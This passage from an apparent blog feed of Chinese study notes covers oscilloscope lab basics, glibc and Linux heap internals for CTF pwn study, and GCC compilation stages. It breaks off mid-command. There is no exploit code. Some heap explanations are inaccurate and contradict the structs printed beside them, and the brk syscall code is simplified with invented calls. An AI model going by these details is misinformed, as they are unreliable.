为了及时显示输入信号随时间变化的特性，示波器不停地采集信号并更新屏幕显示。对于周期不变的信号，我们希望屏幕上前后两次显示的信号轨迹能互相重叠；对于非周期性信号，我们希望特定的信号能显示在相同的位置，这些都会方便用户对图像和数据进行下一步的分析和处理。示波器中实现上述功能的组件称作触发逻辑；它在用户选择的信号（如CH1的输入信号）满足一定条件（如大于用户设定的触发电平，Trigger Level）时给出触发信号，这实际上是根据用户的设定来确定每次信号更新显示的时间零点。</p><p>在模拟示波器中，在屏幕上“画出”波形的电子束是在触发信号满足条件后才开始扫描，因此，用户无法得知满足触发条件之前的信号是怎样的。与此不同，数字示波器的数据采集一直在进行，不仅保存触发之后的信号，也保存触发前的信号，这有利于了解信号变化的整个过程。</p><p>本实验中，我们希望学生学会选用输入信号做触发，明白触发电平设置的重要性，了解边沿触发模式时，上升沿和下降沿触发的区别。</p><p>⑥ <strong>显示：</strong> 数字示波器一般用液晶屏（Liquid Crystal Display，以下简称LCD）作显示。与CRT显示不同（注6)，LCD是利用点阵中每个像素的亮暗状态来显示文字和图形，文字和图形在屏幕上保持的时间可以根据需要来设定。另外，在LCD像素数已知的情况下，选定档位后，每个像素点在Y，t两个方向上所表示的值也是可以得到的，这直接决定了从屏幕上进行光标读数的精度。</p><p><strong>注6：</strong> 借助荧光屏的余辉，CRT靠电子束在屏幕上快速扫描留下的轨迹显示信号的连续变化过程。</p><p>⑦ <strong>信号发生器原理</strong> 在研究、调试电子线路、电学设备的性能时，需要输入已知特性的电学信号，以检测研究对象的输出结果与预期是否一致。信号发生器就是用于产生所需信号的仪器。本实验中所用的信号发生器的输出功率较小（4W），也被称作函数信号发生器，或波形发生器。</p><p>信号发生器一般由三个模块组成（注7）：（一）基于LC电路或晶体振荡器等元件构成的振荡电路，用于产生周期信号（一般为正弦或方波），并提供频率调节；（二）基于非线性元件（如电容的充、放电曲线有非线性）或差分放大电路等构建的波形变换电路，根据用户的选择将振荡器产生的信号变换为所需的信号形式，包括正弦、方波、三角波、锯齿波等（注8）；（三）输出电路，根据用户设定的幅度、直流偏移等参数输出信号，并显示输出信号的参数。</p><p>本实验所用的信号发生器能调节的参数包括（注9）：</p><ol><li>信号类型：正弦、方波、三角波、脉冲（1%~99%）；</li><li>频率：范围0.2Hz~5MHz；</li><li>幅度：范围100mV~10V；</li><li>直流偏置：输出信号最大值与最小值的中点偏离实际电压零点的大小，范围-10~10V；</li><li>衰减倍率：范围0~60dB；</li><li>占空比：输出周期信号的上升段（这是对正弦和三角波，对方波则是高电平段）时间占整个周期的比例；</li></ol><p>**注7：**随着集成电路技术的发展，现在已有各种专门用于信号发生器开发的芯片，如LM324等，这大大简化了自制信号发生器的过程，欢迎有兴趣的同学进一步探索、实践。</p><p>**注8：**有些厂家提供的信号发生器还能产生阶梯信号、类噪声信号等，甚至提供频率调制、幅度调制等功能，以满足不同的需求。</p><p>**注9：**除了这里列出来的参数，欢迎同学参考仪器说明书等资料自己探索更多可调参数。</p><h4 id="拓展阅读"><a href="#拓展阅读" class="headerlink" title="拓展阅读"></a>拓展阅读</h4><p>欢迎有兴趣的同学自己查阅资料了解以下术语的含义： 带宽、幅频曲线、采样、等效采样、实时采样、存储深度、边沿触发、上升沿、下降沿、采样示波器、功率信号发生器。了解这些术语的含义有益于各位同学加深对数字示波器及其性能指标、工作原理等的了解。</p><h3 id="实验内容（具体参看实验报告册）"><a href="#实验内容（具体参看实验报告册）" class="headerlink" title="实验内容（具体参看实验报告册）"></a>实验内容（具体参看实验报告册）</h3><ol><li>自动测量-“AUTO”；</li><li>图像和数据的存储；</li><li>屏幕估读；</li><li>光标读数——“CURSOR”；</li><li>交直流混合信号的测量；</li><li>信号衰减；</li><li>周围空间的电磁信号测量。</li></ol>]]></content>
    
    
    <categories>
      
      <category>大连理工大学学习</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>堆利用</title>
    <link href="/%E5%A0%86%E5%88%A9%E7%94%A8/"/>
    <url>/%E5%A0%86%E5%88%A9%E7%94%A8/</url>
    
    <content type="html"><![CDATA[<h1 id="堆利用"><a href="#堆利用" class="headerlink" title="堆利用"></a>堆利用</h1><p>目前堆的实现有很多种，具体如下</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell">dlmalloc  – General purpose allocator<br>ptmalloc2 – glibc<br>jemalloc  – FreeBSD and Firefox<br>tcmalloc  – Google<br>libumem   – Solaris<br></code></pre></td></tr></table></figure><h2 id="part-1"><a href="#part-1" class="headerlink" title="part_1"></a>part_1</h2><p>学习文章：<a href="https://blog.csdn.net/weixin_52622200/article/details/135722769">【Linux 内核源码分析】堆内存管理-CSDN博客</a></p><h4 id="堆"><a href="#堆" class="headerlink" title="堆"></a>堆</h4><p>堆是一种动态分配内存的数据结构，用于存储和管理动态分配的对象。它是一块连续的内存空间，用于存储程序运行时动态申请的内存。</p><p>堆可以被看作是<strong>一个由各个内存块组成的堆栈</strong>，其中每个内存块都有一个地址指针，指向下一个内存块。当程序需要分配内存时，堆会根据分配算法找到一块足够大的连续内存空间，并将其分配给程序。程序可以在堆中动态创建和销毁对象，而不需要在编译时确定对象的数量或大小。</p><p>与静态分配的栈不同，堆的内存分配不是自动的，需要显式地通过内存分配函数（如malloc、new等）来申请内存空间，并在不使用时通过释放函数（如free、delete等）来释放已分配的内存。这种动态的内存管理方式使得程序能够根据实际需要来动态调整内存的使用情况。</p><h4 id="堆内存管理"><a href="#堆内存管理" class="headerlink" title="堆内存管理"></a>堆内存管理</h4><p>在Linux操作系统中，堆内存是指用于动态分配的一块内存区域。它与程序的堆栈（stack）不同，堆内存是由程序员通过函数如malloc()、calloc()或realloc()等来手动申请和释放的。</p><p><strong>堆内存的特点：</strong></p><ol><li>大小可变：堆内存的大小可以在运行时动态地调整，适应不同需求。</li><li>手动管理：开发人员需要手动申请和释放堆内存，并且负责确保正确使用和及时释放，以避免内存泄漏或悬挂指针等问题。</li><li>随机访问：程序可以随机访问堆内存中的数据。</li><li>生命周期长：除非显式释放或程序结束，否则分配给堆内存的空间会一直存在</li></ol><p>堆内存是连续分配的内存，在大多数操作系统中，包括Linux，堆内存是通过动态分配内存来管理的。它<strong>通常是一个连续的内存区域</strong>，用于动态分配和释放内存块。</p><p>堆内存的生长方向是自下而上：在传统的内存布局中，堆内存的生长方向是<strong>从低地址向高地址增长</strong>。这意味着每次分配新的内存块时，堆会从较低的地址向上移动。</p><p>堆内存的管理由 Linux 内核实现：Linux 内核提供了一些系统调用和函数，用于管理堆内存。这些系统调用和函数使开发者能够请求分配和释放堆内存，但开发者并不直接知道堆的管理细节。</p><p>系统调用用于调用相关函数：开发者可以使用系统调用来请求堆内存的扩展和收缩。其中一个常用的系统调用是 <code>brk</code>，它负责调整程序的堆边界，以便在需要时扩展或收缩堆内存。</p><p>在 Linux 内核中，<code>mm_struct</code> 结构体表示进程的内存管理信息，其中包含了堆的起始地址和结束地址：</p><ul><li><code>start_brk</code> 表示堆内存在虚拟地址空间中的起始地址，通常是初始的堆边界。</li><li><code>brk</code> 表示堆内存在虚拟地址空间中的结束地址，即当前的堆边界。</li></ul><p><code>start_brk</code> 和 <code>brk</code> 之间的地址空间就是堆内存的大小。在进程运行过程中，可以通过相应的系统调用（如 <code>brk</code> 或 <code>sbrk</code>）来动态扩展或收缩堆内存的大小，从而改变堆边界的位置。</p><p>需要注意的是，<code>mm_struct</code> 结构体中还包含了其他与内存管理相关的信息，如代码段、数据段、栈等的起始地址和结束地址。这些信息共同构成了进程的虚拟地址空间，用于进行内存管理和保护。</p><p>Slab 是一种基于对象缓存的内存分配器。它将内核对象按照类型进行分类，并为每种类型分配一个独立的缓存池，缓存池中包含了若干个连续的 Slab 对象，当内核对象需要分配内存时，Slab 分配器会从相应的缓存池中申请一个 Slab 对象，并将其划分为多个小块以供程序使用。当程序释放内存时，Slab 分配器会将该内存块标记为空闲状态，并加入到 Slab 缓存池中以供后续的内存分配使用。Slab 分配器通过对象缓存机制，可以提高内存分配效率和内存利用率，并减少内存碎片的产生。</p><p>SLOB（Simple List Of Blocks）是一种基于 Free 链表的简单内存分配器。它通过维护一个链表来记录空闲块的位置和大小，当程序需要分配内存时，SLOB 分配器会在 Free 链表中查找一个大小合适的空闲块，并将该块分配给程序。当程序释放内存时，SLOB 分配器会将该内存块加入到 Free 链表中，以供后续的内存分配使用。SLOB 分配器由于实现简单，因此可以在内核体积和性能之间进行权衡。</p><h4 id="内存描述mm-struct结构体"><a href="#内存描述mm-struct结构体" class="headerlink" title="内存描述mm_struct结构体"></a>内存描述mm_struct结构体</h4><p>在 Linux 内核源码的 <code>include/linux/mm_types.h</code> 文件中包含了 <code>mm_struct</code> 结构体的定义。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">mm_struct</span> &#123;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">vm_area_struct</span> *<span class="hljs-title">mmap</span>;</span>     <span class="hljs-comment">/* VMA链表 */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">rb_root</span> <span class="hljs-title">mm_rb</span>;</span><br>u64 vmacache_seqnum;              <span class="hljs-comment">/* 每个线程的vmacache */</span><br><br><span class="hljs-comment">// ...</span><br><br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> hiwater_rss;        <span class="hljs-comment">/* RSS使用的高水位标记 */</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> hiwater_vm;         <span class="hljs-comment">/* 虚拟内存使用的高水位标记 */</span><br><br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> total_vm;           <span class="hljs-comment">/* 映射的总页数 */</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> locked_vm;          <span class="hljs-comment">/* 设置了 PG_mlocked 的页面 */</span><br><span class="hljs-type">atomic64_t</span>    pinned_vm;          <span class="hljs-comment">/* 引用计数永久增加的页面 */</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> data_vm;            <span class="hljs-comment">/* VM_WRITE &amp; ~VM_SHARED &amp; ~VM_STACK */</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> exec_vm;            <span class="hljs-comment">/* VM_EXEC &amp; ~VM_WRITE &amp; ~VM_STACK */</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> stack_vm;           <span class="hljs-comment">/* VM_STACK */</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> def_flags;<br><br><span class="hljs-type">spinlock_t</span> arg_lock;              <span class="hljs-comment">/* 保护下面的字段 */</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> start_code, end_code, start_data, end_data;   <span class="hljs-comment">/* 代码段、数据段的起始和结束地址 */</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> start_brk, brk, start_stack;                  <span class="hljs-comment">/* 堆、栈的起始地址 */</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> arg_start, arg_end, env_start, env_end;       <span class="hljs-comment">/* 命令行参数、环境变量的起始和结束地址 */</span><br><br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> saved_auxv[AT_VECTOR_SIZE]; <span class="hljs-comment">/* 用于 /proc/PID/auxv */</span><br><br><span class="hljs-comment">// ...</span><br>&#125; __randomize_layout;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * mm_cpumask 需要放在 mm_struct 的末尾，因为它的大小是根据 nr_cpu_ids 动态确定的。</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> cpu_bitmap[];<br>&#125;;<br></code></pre></td></tr></table></figure><p>mm_struct 结构体中的 start_brk、brk 成员<br>在 mm_struct 结构体中，start_brk 和 brk 是与进程的堆内存相关的成员变量。</p><p>start_brk 表示进程堆的起始地址。<br>brk 表示进程堆的结束地址。<br>虚拟地址空间是一个抽象的概念，用于表示进程可用的地址范围。它将进程的内存分为多个区域，包括代码段、数据段、堆、栈等。堆是其中的一个区域，用于动态分配内存。</p><p>start_brk 是堆内存的起始地址，表示堆的开始位置。在该地址之前的内存区域属于其他区域（如数据段），而在该地址之后的内存区域则属于堆。</p><p>brk 是堆内存的结束地址，表示堆的结束位置。堆的所有分配的内存都位于 start_brk 和 brk 之间。</p><p>通过控制 brk 的值，可以动态调整堆内存的大小。当需要分配更多的堆内存时，可以通过增加 brk 的值来扩展堆，使其占用更多的虚拟地址空间。相反，当释放不再需要的堆内存时，可以通过减小 brk 的值来缩小堆的大小，从而释放占用的虚拟地址空间。</p><p>在 Linux 内核源码的 include&#x2F;linux&#x2F;mm_types.h 文件中，包含了 start_brk 和 brk 成员的定义。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> start_brk; <span class="hljs-comment">// 堆内存的起始地址</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> brk;       <span class="hljs-comment">// 堆内存的结束地址</span><br></code></pre></td></tr></table></figure><h4 id="动态分配内存堆"><a href="#动态分配内存堆" class="headerlink" title="动态分配内存堆"></a>动态分配内存堆</h4><p>在 Linux 系统中，有两种常见的方式用于动态分配堆内存：</p><p><strong>1.brk() 和 sbrk()</strong>：这是最基本和最原始的动态内存分配方式。brk() 函数用于将进程的堆结束地址设置为指定的值，从而控制堆内存的大小。sbrk() 函数则通过增加进程的堆结束地址来分配内存，通过减小堆结束地址来释放内存。这些函数存在于 POSIX 标准中，是 C 语言标准库中的一部分。</p><p><strong>2.malloc() 和 free()</strong>：这是更高级的动态内存分配方式。malloc() 函数用于在堆内存中分配指定大小的内存块，并返回指向该内存块的指针。free() 函数用于释放先前分配的内存块。这些函数在 C 标准库中实现，通常会比 brk() 和 sbrk() 更易于使用和管理。</p><p>这两种动态内存分配方式各有优点和缺点。brk() 和 sbrk() 的优势在于它们非常简单且直接，可以轻松地控制堆内存的大小。但是，它们的缺点是<strong>需要手动管理内存</strong>，并且容易出现<strong>内存泄漏</strong>和其他问题。malloc() 和 free() 则提供了更高级的内存管理功能，使得内存分配和释放更容易且更安全。但是，它们的实现可能会比较复杂，可能需要使用锁和其他机制来确保多线程环境下的正确性。</p><h5 id="brk系统调用"><a href="#brk系统调用" class="headerlink" title="brk系统调用"></a><strong>brk系统调用</strong></h5><p><img src="/./../00000000/image-20250407185611211.png" alt="image-20250407185611211"></p><p>在Linux内核源码中的<code>mm/mmap.c</code>文件中，可以找到<code>brk</code>系统调用的定义。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs c">SYSCALL_DEFINE1(brk, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>, brk)<br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">mm_struct</span> *<span class="hljs-title">mm</span> =</span> current-&gt;mm; <span class="hljs-comment">// 获取当前进程的内存管理结构体</span><br><br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> newbrk, oldbrk; <span class="hljs-comment">// 定义新旧的堆结束地址</span><br><br>down_write(&amp;mm-&gt;mmap_sem); <span class="hljs-comment">// 获取内存管理信号量，防止并发访问</span><br><br>oldbrk = mm-&gt;brk; <span class="hljs-comment">// 保存旧的堆结束地址</span><br>newbrk = PAGE_ALIGN(brk); <span class="hljs-comment">// 对传入的新堆结束地址进行页面对齐操作</span><br><br><span class="hljs-comment">// 检查新的堆结束地址是否在合法范围内</span><br><span class="hljs-keyword">if</span> (newbrk &lt; mm-&gt;start_brk || newbrk &gt; TASK_SIZE) &#123;<br>up_write(&amp;mm-&gt;mmap_sem); <span class="hljs-comment">// 释放内存管理信号量</span><br><span class="hljs-keyword">return</span> -ENOMEM; <span class="hljs-comment">// 返回内存分配错误</span><br>&#125;<br><br><span class="hljs-comment">// 调用 expand_brk() 函数扩展堆内存</span><br><span class="hljs-keyword">if</span> (expand_brk(mm, newbrk)) &#123;<br>up_write(&amp;mm-&gt;mmap_sem); <span class="hljs-comment">// 释放内存管理信号量</span><br><span class="hljs-keyword">return</span> -ENOMEM; <span class="hljs-comment">// 返回内存分配错误</span><br>&#125;<br><br>mm-&gt;brk = newbrk; <span class="hljs-comment">// 更新堆结束地址为新的值</span><br>up_write(&amp;mm-&gt;mmap_sem); <span class="hljs-comment">// 释放内存管理信号量</span><br><br><span class="hljs-keyword">return</span> oldbrk; <span class="hljs-comment">// 返回旧的堆结束地址</span><br>&#125;<br></code></pre></td></tr></table></figure><p>通过使用brk系统调用，可以指定堆内存在虚拟内存空间的结束地址。</p><p>当需要扩展堆内存时，可以将结束地址设置为大于当前值。这样，系统会增加虚拟内存空间以容纳更多的堆内存，并将新的结束地址返回给调用者。</p><p>而当需要收缩堆内存时，可以将结束地址设置为小于当前值。这样，系统会释放超过该结束地址的部分虚拟内存空间，使其可供其他用途使用。</p><h5 id="mmap系统调用"><a href="#mmap系统调用" class="headerlink" title="mmap系统调用"></a><strong>mmap系统调用</strong></h5><p><code>mmap</code>系统调用的相关代码可以在Linux内核源码的<code>mm/mmap.c</code>文件中找到。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs c">SYSCALL_DEFINE6(mmap, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>, addr, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>, len,<br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>, prot, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>, flags,<br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>, fd, <span class="hljs-type">off_t</span>, offset)<br>&#123;<br><span class="hljs-comment">/* ...其他代码... */</span><br><br><span class="hljs-keyword">if</span> (!(flags &amp; MAP_FIXED)) &#123;<br>addr = vm_mmap_pgoff(file, addr, len, prot, flags, offset);<br><span class="hljs-keyword">if</span> (unlikely(IS_ERR_VALUE(addr)))<br><span class="hljs-keyword">return</span> addr;<br><span class="hljs-keyword">goto</span> out;<br>&#125;<br><br><span class="hljs-comment">/* ...其他代码... */</span><br><br>out:<br><span class="hljs-keyword">return</span> addr;<br>&#125;<br><br></code></pre></td></tr></table></figure><p><code>mmap</code> 系统调用执行成功时，返回映射区域的起始地址，该地址与请求的 <code>addr</code> 可能会有所不同（如果 <code>addr</code> 是 <code>NULL</code>，则由操作系统自动分配合适的地址）。如果发生错误，<code>mmap</code> 返回 <code>MAP_FAILED</code>。</p><h4 id="heap-info"><a href="#heap-info" class="headerlink" title="heap_info"></a>heap_info</h4><p>在 Linux 中，堆管理是通过内核提供的系统调用和库函数来实现的。其中，glibc 库是 Linux 上最常用的 C 语言库之一，它提供了一组用于堆管理的函数，如 malloc、free、calloc、realloc 等。</p><p>在 glibc 中，堆是由多个内存块组成的链表，每个内存块都有一个 heap_info 结构体来描述它所在的堆。heap_info 结构体定义在 glibc 的 malloc&#x2F;malloc.c 文件中，它包含以下字段：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs shell">ar_ptr：指向 arena 结构体的指针，表示该堆所属的 arena。<br>prev：指向前一个 heap_info 结构体的指针，用于链接所有的 heap_info 结构体。<br>next：指向后一个 heap_info 结构体的指针，用于链接所有的 heap_info 结构体。<br>size：表示该堆的大小，以字节为单位。<br>mprotect_size：表示该堆末尾未使用部分的大小，以字节为单位。<br>pad：填充字段，保证 heap_info 结构体大小为 32 字节。<br>free_list：指向该堆中空闲内存块链表的头指针。<br></code></pre></td></tr></table></figure><p>通过遍历 heap_info 结构体链表，程序可以获取当前进程所有的堆信息，并对其进行操作和监控。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">heap_info</span></span><br><span class="hljs-class">&#123;</span><br>    mstate ar_ptr;              <span class="hljs-comment">/* 指向该堆所属的 arena。*/</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">heap_info</span> *<span class="hljs-title">prev</span>;</span>    <span class="hljs-comment">/* 前一个堆。*/</span><br>    <span class="hljs-type">size_t</span> size;                <span class="hljs-comment">/* 当前堆的大小（以字节为单位）。*/</span><br>    <span class="hljs-type">size_t</span> mprotect_size;       <span class="hljs-comment">/* 已经通过 mprotect 保护的大小（以字节为单位），具有 PROT_READ|PROT_WRITE 权限。*/</span><br>    <span class="hljs-comment">/* 确保以下数据正确对齐，特别是 sizeof(heap_info) + 2 * SIZE_SZ 是 MALLOC_ALIGNMENT 的倍数。 */</span><br>    <span class="hljs-type">char</span> pad[<span class="hljs-number">-6</span> * SIZE_SZ &amp; MALLOC_ALIGN_MASK]; <span class="hljs-comment">/* 填充字段，用于满足对齐要求。*/</span><br>&#125; heap_info;<br></code></pre></td></tr></table></figure><h4 id="malloc-state"><a href="#malloc-state" class="headerlink" title="malloc_state"></a><strong>malloc_state</strong></h4><p><code>malloc_state</code> 可以看作是堆管理中的 Arena Header，它维护了当前线程所属的堆内存的状态。每个线程只包含一个 <code>malloc_state</code> 结构体，用于管理该线程所使用的堆内存。在多线程环境下，不同线程的 <code>malloc_state</code> 结构体相互独立，互不干扰。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs shell">mutex：互斥锁，用于保证多线程下对 malloc_state 结构体的访问是线程安全的。<br>fastbinsY[NFASTBINS]：fastbins 数组，用于快速分配大小在某个范围内的小块内存。<br>top：指向堆内存中最顶部的未分配内存的位置。<br>last_remainder：最近一次小块内存分配时剩余的空闲内存块。<br>bins[NBINS * 2 - 2]：按照固定大小的范围组织的普通内存块链表。<br>binmap[BINMAPSIZE]：内存块链表的位图，表示每个链表是否为空。<br>max_fast：fastbins 范围的上限，即最大可以使用 fastbins 的大小。<br>fastbins[NFASTBINS]：快速分配内存的 fastbins，用于存放刚刚释放的小块内存，以便下次快速分配时能够优先使用。<br>least_addr：堆中最小的地址。<br>unsorted_chunks：未排序的内存块链表。<br>system_mem：从系统中分配的内存总量。<br>max_system_mem：允许从系统中分配的最大内存量。<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>CTF_PWN</category>
      
      <category>blog_learning</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>二进制文件</title>
    <link href="/%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%96%87%E4%BB%B6/"/>
    <url>/%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%96%87%E4%BB%B6/</url>
    
    <content type="html"><![CDATA[<h1 id="二进制文件"><a href="#二进制文件" class="headerlink" title="二进制文件"></a>二进制文件</h1><h2 id="从源代码到可执行文件"><a href="#从源代码到可执行文件" class="headerlink" title="从源代码到可执行文件"></a>从源代码到可执行文件</h2><h3 id="编译原理"><a href="#编译原理" class="headerlink" title="编译原理"></a>编译原理</h3><p><strong>编译器：</strong></p><p>读入以某种语言 ( 源语言 ) 编写的程序，，输出等价的另一种语言 ( 目标语言 )另一种语言编写的程序</p><p>分为<strong>前端</strong>和<strong>后端</strong> </p><p>前端与机器无关，其功能是把源程序分解成组成要素和相应的语法结构，通过这个结构创建源程序的中间表示，同时收集与源程序相关的信息，存放到符号表里面</p><p>后端与机器相关，其功能是根据中间表示和符号表信息构造目标程序。</p><h4 id="编译过程"><a href="#编译过程" class="headerlink" title="编译过程"></a>编译过程</h4><p><strong>编译过程 [ 1 ] 词法分析</strong></p><p>读入程序字符流，输出有意义的词素</p><p><strong>编译过程 [ 2 ] 语法分析</strong></p><p>根据各个词法单元的第一个分量创造树型的中间表达式，检测源程序是否满足语言定义的语义约束，同时收集同类型信息</p><p><strong>编译过程 [ 3 ] 语义分析</strong></p><p>使用语法树和符号表中的信息，检测源程序是否满足语言定义的语义约束，同时收集类型信息，用于代码生成，类型检测和类型转换</p><p><strong>编译过程 [ 4 ] 中间代码的生成和优化</strong></p><p>根据语义分析输出，生成类机械语言的中间表示，如三地址码。然后对生成的中间代码进行分析和优化</p><p><strong>编译过程  [ 5 ] 代码的生成和优化</strong></p><p>把中间表示形式映射到目标机器语言</p><p><strong>编译过程图解：</strong></p><p><img src="/../00000000/image-20250401195100232.png" alt="image-20250401195100232"></p><h3 id="GCC编译过程"><a href="#GCC编译过程" class="headerlink" title="GCC编译过程"></a>GCC编译过程</h3><p><strong>主要包括四个阶段：”预处理”,”编译”,”汇编”,”链接”</strong></p><p>该过程主要用到三个工具：cc1 , as , collect2</p><p>cc1是编译器，对应第一阶段和第二阶段，用于将源文件 file.c 转为 file.s</p><p>as是汇编器，对应第三阶段，用于将 file.s 汇编为 file.o目标文件</p><p>collect2是对ld命令的封装，用于将C语言运行时库中的文件以及所需要动态链接库链接到可执行hello</p><h4 id="预处理阶段"><a href="#预处理阶段" class="headerlink" title="预处理阶段"></a>预处理阶段</h4><p>主要是<strong>处理</strong>源代码中以“#”开始的<strong>预处理指令</strong>，比如“#include”，“#define”等，将其转换后直接插入程序文本中，得到另一个以.i为扩展名的C程序</p><h4 id="编译阶段"><a href="#编译阶段" class="headerlink" title="编译阶段"></a>编译阶段</h4><p>将预处理文件惊醒一系列的词法分析，语法分析，语义分析及优化，最终<strong>生成汇编代码</strong>，file.s文件</p><h4 id="汇编阶段"><a href="#汇编阶段" class="headerlink" title="汇编阶段"></a>汇编阶段</h4><p>汇编器根据汇编指令与机械指令的对照表进行翻译，将 file.s 汇编成目标文件 file.o ，这时的 file.o 是一个可重定位文件</p><p>用objdump查看内容会发现，由于此时还未进行连接，对象文件中符号的虚拟地址无法确定。</p><h4 id="链接阶段"><a href="#链接阶段" class="headerlink" title="链接阶段"></a>链接阶段</h4><p>GCC默认使用动态链接，可以添加编译选项“ -static ”即可指定使用静态链接，操作完后可以再objdump查看，可以看到，链接操作以后，对象文件中无法确定的符号地址已经被修改成了实际的符号地址。</p><h3 id="GCC编译过程实验"><a href="#GCC编译过程实验" class="headerlink" title="GCC编译过程实验"></a>GCC编译过程实验</h3><p><strong>源码：</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;hello,world\n&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>编译操作：</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">briteny@localhost:/mnt/d/scr1w/test$ gcc hello.c -o hello -save-temps 